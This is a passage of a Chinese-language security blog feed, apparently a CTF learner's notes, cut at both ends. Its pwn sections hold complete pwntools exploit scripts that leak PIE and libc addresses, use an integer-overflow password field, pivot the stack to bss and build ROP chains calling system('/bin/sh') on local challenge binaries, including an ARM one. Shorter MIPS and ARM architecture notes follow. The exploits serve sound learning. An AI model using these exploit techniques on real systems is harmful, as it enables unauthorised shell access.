class="keyword">break</span></span><br></pre></td></tr></table></figure><p>方法二:直接泄露地址<br>因为PIE影响的只是程序加载基址，并不会影响指令间的相对地址,如果我们可以泄露出一个程序或ibc的某些地址，我们就可以利用地址<br>减去偏移地址得到基地址,从而算出其他函数的地址,这种方法也是我们最常用的方法.<br>通过泄露地址来计算libc基地址的时候需要注意的是libc版本不同,对应的偏移也不同.</p><h3 id="例题：-2"><a href="#例题：-2" class="headerlink" title="例题："></a>例题：</h3><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207071037766.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207071037766.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf = ELF(name)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Tell me your name:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">pro_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>) - <span class="number">0x82d</span></span><br><span class="line">puts_got_addr = pro_addr + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr = pro_addr + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = pro_addr + elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;pro_addr: &quot;</span> + <span class="built_in">hex</span>(pro_addr))</span><br><span class="line">success(<span class="string">&quot;puts_got_addr: &quot;</span> + <span class="built_in">hex</span>(puts_got_addr))</span><br><span class="line">success(<span class="string">&quot;puts_plt_addr: &quot;</span> + <span class="built_in">hex</span>(puts_plt_addr))</span><br><span class="line">success(<span class="string">&quot;main_addr: &quot;</span> + <span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?\n&quot;</span>)</span><br><span class="line">pop_rdi_addr = pro_addr + <span class="number">0x843</span></span><br><span class="line">payload1 = <span class="string">b&quot;a&quot;</span>*<span class="number">184</span> </span><br><span class="line">payload1 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Bye!\n&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>) - <span class="number">0x68f90</span></span><br><span class="line">system_addr = libc_addr + <span class="number">0x3f480</span></span><br><span class="line">bin_sh_addr = libc_addr + <span class="number">0x1619d9</span></span><br><span class="line">success(<span class="string">&quot;libc_addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;bin_sh_addr: &quot;</span> + <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Tell me your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;c&quot;</span>*<span class="number">184</span>  </span><br><span class="line">payload2 += p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="整数溢出："><a href="#整数溢出：" class="headerlink" title="整数溢出："></a>整数溢出：</h2><p>类型一:未限制范围<br>这种情况主要是变量有固定大小的字节,但是却允许我们输入无限多的数据,和gets()函数产生的栈溢出很相似</p><p>类型二:错误的类型转换<br>正确的对变量进行了约束但是在类型转换上面出错了,范围大的变量赋值给范围小的变量</p><h3 id="例题：-3"><a href="#例题：-3" class="headerlink" title="例题："></a>例题：</h3><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207082002448.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207082002448.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207082002373.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207082002373.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>程序为dest分配了0x14字节的储存空间，而第二个read函数可以读取0x199个字节，这个地方存在栈溢出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&quot;./int_over&quot;</span>)</span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span>*<span class="number">24</span> + <span class="built_in">p32</span>(<span class="number">0x804868b</span>)</span><br><span class="line">payload += b<span class="string">&quot;b&quot;</span>*(<span class="number">0x104</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;Please input your username:\n&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(<span class="string">&quot;sir&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;Please input your passwd:\n&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(payload)</span><br><span class="line">p.interactive</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="栈迁移："><a href="#栈迁移：" class="headerlink" title="栈迁移："></a>栈迁移：</h2><p>劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP等操作;<br>通俗的讲其实就是将ESP或RSP指针修改为我们可以控制的内存区地址比如bss段堆等位置,然后在可控内存区当中布置payload等;</p><p>条件:</p><p>1.程序存在溢出;<br>2.可以控制sp指针;</p><p>用途:</p><p>1.栈益出可以溢出的空间大小不足</p><p>因为我们的主要思想是修改sp指针,所以我们需要通过一些汇编指令来修改sp指针,常用汇编指令:;</p><p>1.pop esp;<br>2.pop ecx; lea esp,[ecx-Ox4];<br>3.leave; ret; —&gt; mov esp, ebp; pop ebp; ret;</p><p>需要注意的地方:</p><p>1.迁移过去的内存一定要可读可写;</p><p>⒉.迁移过去的内存要注意离不可读不可写的内存要远一些,因为调用一些函数的时候需要较大的栈空间;</p><p>3.我们构造的栈空间和程序的栈空间有相同的性质,即push,pop等操作对sp,bp指针的操作一样;</p></div><div class="story post-story"><h2 id="例题：-4"><a href="#例题：-4" class="headerlink" title="例题："></a>例题：</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207082051726.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207082051726.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&quot;./test1&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.<span class="built_in">attach</span>(p)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x80495d0</span></span><br><span class="line">system_plt = <span class="number">0x8048370</span></span><br><span class="line">read_plt = <span class="number">0x8048340</span></span><br><span class="line">leave_ret = <span class="number">0x80484d5</span></span><br><span class="line">pop3_ret = <span class="number">0x080485a9</span></span><br><span class="line">gadgets = <span class="number">0x8048549</span></span><br><span class="line">bss = <span class="number">0x804a560</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">p32</span>(read_plt) + <span class="built_in">p32</span>(pop3_ret) + <span class="built_in">p32</span>(<span class="number">0</span>) + <span class="built_in">p32</span>(bss) + <span class="built_in">p32</span>(<span class="number">100</span>) </span><br><span class="line">payload += <span class="built_in">p32</span>(gadgets) + <span class="built_in">p32</span>(bss + <span class="number">4</span>)</span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;Hello,tell me your story:\n&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(payload)</span><br><span class="line"></span><br><span class="line">payload1 = b<span class="string">&quot;b&quot;</span>*<span class="number">10</span> + <span class="built_in">p32</span>(<span class="number">0x804a060</span> + <span class="number">4</span>)</span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;By the way, what&#x27;s your name:\n&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span>(<span class="number">1</span>)</span><br><span class="line">payload2 = <span class="built_in">p32</span>(system_plt) + b<span class="string">&quot;aaaa&quot;</span> + <span class="built_in">p32</span>(bin_sh_addr) </span><br><span class="line">p.<span class="built_in">sendline</span>(payload2)</span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>armpwn入门</title>
      <link href="/2022/07/05/armpwn%E5%85%A5%E9%97%A8/"/>
      <url>/2022/07/05/armpwn%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207051416592.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207051416592.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207051418503.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207051418503.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><div class="story post-story"><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>info functions ：显示程序的使用的函数</p><p>disassemble 函数名 ：反汇编指定函数</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207051500207.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207051500207.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>查看内存命令x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; <addr></p><p>n是一个正整数，表示显示内存的长度f 表示显示的格式</p><p>u表示从当前地址往后请求的字节数(u参数可以用下面的字符来代替b表示单字节，h表示双字节，w表示四字节，g表示八字节)</p><h1 id="编译arm架构程序并用qemu执行"><a href="#编译arm架构程序并用qemu执行" class="headerlink" title="编译arm架构程序并用qemu执行"></a>编译arm架构程序并用qemu执行</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译</span></span><br><span class="line">arm-linux-gnueabihf-gcc -g hello.c -o eastgets</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">qemu执行 动态链接程序，需要指定libc的位置</span></span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabihf/ ./eastgets</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052019907.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052019907.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h1 id="typo-例题"><a href="#typo-例题" class="headerlink" title="typo(例题)"></a>typo(例题)</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052051641.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052051641.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>32位arm小端，静态编译，没有符号表</p><h3 id="恢复符号表"><a href="#恢复符号表" class="headerlink" title="恢复符号表"></a>恢复符号表</h3><p>对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</p><p><a href="https://www.freebuf.com/articles/terminal/134980.html">https://www.freebuf.com/articles/terminal/134980.html</a></p><p>arm架构的libc在 &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib里面</p><p>尝试恢复符号表：</p><p>（1）下载对应libc.so</p><p>sudo apt install libc6-armhf-cross cp &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib&#x2F;libc-2.23.so .&#x2F;</p><p>（2）下载rizzo插件</p><p>使用rizzo插件：</p><p><a href="https://github.com/fireundubh/IDA7-Rizzo">https://github.com/fireundubh/IDA7-Rizzo</a></p><p>放入：C:\Program Files\IDA 7.0\plugins</p><p>（3）用IDA打开libc-2.23.so</p><p>导出libc.23.so.riz:</p><p>File-&gt;Produce file-&gt;Rizzo signature file</p><p>（4）打开目标程序</p><p>加载.riz:</p><p>File-&gt;Load file-&gt;Rizzo signature file</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052140423.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052140423.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>溢出函数</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052141366.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052141366.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>arm架构下32bit程序，函数的前四个参数分别保存在r0~r3寄存器中，其余的参数在栈中，函数返回值 保存在寄存器r0中。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052153322.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207052153322.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>找到0x20904，将“&#x2F;bin&#x2F;sh”地址赋给r0，并将system的地址赋给pc，就可以执行system(“&#x2F;bin&#x2F;sh”)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">112</span> + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>)*<span class="number">2</span> + p32(<span class="number">0x110b4</span>)</span><br><span class="line">p = process(<span class="string">&quot;./typo&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;----&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mips基础</title>
      <link href="/2022/07/03/Mips%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/07/03/Mips%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="基本特点"><a href="#基本特点" class="headerlink" title="基本特点"></a>基本特点</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207040924460.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207040924460.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207040949000.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207040949000.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h1 id="流水线操作"><a href="#流水线操作" class="headerlink" title="流水线操作"></a>流水线操作</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041001178.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041001178.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h1 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041013626.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041013626.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h1 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041015636.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041015636.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h1 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h1><div class="story post-story"><h2 id="基础运算"><a href="#基础运算" class="headerlink" title="基础运算"></a>基础运算</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041027515.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041027515.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220704102854144.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220704102854144.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220704102854144"></p></div><div class="story post-story"><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041029743.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041029743.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div><div class="story post-story"><h2 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041034212.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041034212.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div><div class="story post-story"><h2 id="访存"><a href="#访存" class="headerlink" title="访存"></a>访存</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041034318.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041034318.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div><div class="story post-story"><h2 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041033192.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041033192.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div><div class="story post-story"><h2 id="CPU控制指令"><a href="#CPU控制指令" class="headerlink" title="CPU控制指令"></a>CPU控制指令</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041034605.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041034605.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div><div class="story post-story"><h2 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041033216.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207041033216.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><a href="https://freeflyingsheep.github.io/posts/mips/assembly/">MIPS 汇编 | FreeFlyingSheep 的小站</a></p></div>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arm基础</title>
      <link href="/2022/07/01/arm%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/07/01/arm%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="story post-story"><h2 id="arm工作模式"><a href="#arm工作模式" class="headerlink" title="arm工作模式"></a>arm工作模式</h2><p>ARM之所以设计出这么多种模式出来，就是为了<strong>「应对CPU在运行时各种突发事件」</strong>，比如要支持正常的应用程序的运行，在运行任何一个时间点又可能发生很多异常事件，比如：关机、收到网卡信息、除数为0、访问非法内存、解析到了非法指令等等，不光要能处理这些异常还要能够从异常中再返回到原来的程序继续执行。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207011905957.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207011905957.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div><div class="story post-story"><h2 id="两种工作状态"><a href="#两种工作状态" class="headerlink" title="两种工作状态"></a>两种工作状态</h2><p>1、<a href="https://so.csdn.net/so/search?q=ARM&spm=1001.2101.3001.7020">ARM</a>状态：32位，ARM状态执行字对齐的32位ARM指令。</p><p>2、Thumb状态，16位，执行半字对齐的16位指令。</p><p>注：1、ARM和Thumb两种状态之间的切换不影响处理器的工作模式和寄存器的内容。</p><p>​    2、ARM处理器在处理异常时，不管处理器处于什么状态，则都将切换到ARM状态。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207011927151.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207011927151.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701192828236.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701192828236.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220701192828236"></p></div><div class="story post-story"><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207011946946.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207011946946.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>通用寄存器包括R0~R15,可以分为3类:</p><ol><li>未分组寄存器R0~R7</li><li>分组寄存器R8~R14、R13(SP) 、R14(LR)</li><li>程序计数器PC(R15)、R8_fiq-R12_fir为快中断独有</li></ol><h3 id="1-未分组寄存器R0-R7"><a href="#1-未分组寄存器R0-R7" class="headerlink" title="1. 未分组寄存器R0~R7"></a><strong>1. 未分组寄存器R0~R7</strong></h3><p>在所有运行模式下,未分组寄存器都指向同一个物理寄存器,它们未被系统用作特殊的用途.因此在中断或异常处理进行运行模式转换时,由于不同的处理器运行模式均使用相同的物理寄存器,所以可能造成寄存器中数据的破坏。</p><h3 id="2-分组寄存器R8-R14"><a href="#2-分组寄存器R8-R14" class="headerlink" title="2. 分组寄存器R8~R14"></a><strong>2. 分组寄存器R8~R14</strong></h3><p>对于分组寄存器,它们每一次所访问的物理寄存器都与当前处理器的运行模式有关。</p><p>对于R8<del>R12来说,每个寄存器对应2个不同的物理寄存器,当使用FIQ(快速中断模式)时,访问寄存器 R8_fiq</del>R12_fiq;当使用除FIQ模式以外的其他模式时,访问寄存器R8_usr~R12_usr。</p><p>对于R13,R14来说,每个寄存器对应7个不同的物理寄存器,其中一个是用户模式与系统模式共用,另外6个物理寄存器对应其他6种不同的运行模式,并采用以下记号来区分不同的物理寄存器:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 